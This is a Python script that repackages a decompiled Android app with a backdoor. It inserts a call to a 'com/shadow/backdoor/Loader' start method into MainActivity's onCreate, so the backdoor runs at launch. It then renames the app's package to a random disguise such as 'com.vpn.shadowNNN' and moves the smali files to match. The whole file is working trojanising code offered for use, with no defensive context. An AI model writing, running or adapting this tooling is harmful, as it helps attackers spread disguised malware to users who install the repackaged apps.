import os, re, random, shutil

def find_main_activity(smali_dir):
    for root, _, files in os.walk(smali_dir):
        for file in files:
            if file.endswith(".smali") and "MainActivity" in file:
                return os.path.join(root, file)
    return None

def inject_payload(smali_file):
    with open(smali_file, "r", encoding="utf-8") as f:
        lines = f.readlines()

    oncreate_found = False
    for i, line in enumerate(lines):
        if ".method protected onCreate(Landroid/os/Bundle;)V" in line:
            oncreate_found = True
            insert_index = i + 1
            break

    if oncreate_found:
        injection = [
            "    invoke-static {}, Lcom/shadow/backdoor/Loader;->start()V\n"
        ]
        lines = lines[:insert_index] + injection + lines[insert_index:]
        with open(smali_file, "w", encoding="utf-8") as f:
            f.writelines(lines)
        print("[✓] Payload injected into MainActivity.")
    else:
        print("[!] onCreate() not found – skipping injection.")

def random_package():
    parts = ["com", random.choice(["vpn", "tools", "media", "games"]), f"shadow{random.randint(100,999)}"]
    return ".".join(parts)

def change_package_name(manifest_path, smali_dir):
    with open(manifest_path, "r", encoding="utf-8") as f:
        manifest = f.read()

    match = re.search(r'package="([^"]+)"', manifest)
    if not match:
        print("[!] Original package not found in Manifest.")
        return None

    original_pkg = match.group(1)
    new_pkg = random_package()
    print(f"[+] Changing package from {original_pkg} → {new_pkg}")

    manifest = manifest.replace(original_pkg, new_pkg)
    with open(manifest_path, "w", encoding="utf-8") as f:
        f.write(manifest)

    old_path = os.path.join(smali_dir, *original_pkg.split("."))
    new_path = os.path.join(smali_dir, *new_pkg.split("."))

    if os.path.exists(old_path):
        shutil.move(old_path, new_path)
        print(f"[✓] Smali package path updated: {new_path}")
    else:
        print("[!] Original smali package path not found.")

    return new_pkg

# Example Usage
if __name__ == "__main__":
    smali_dir = "tmp/wrapper/smali"
    manifest_path = "tmp/wrapper/AndroidManifest.xml"

    main_smali = find_main_activity(smali_dir)
    if main_smali:
        inject_payload(main_smali)

    new_pkg = change_package_name(manifest_path, smali_dir)
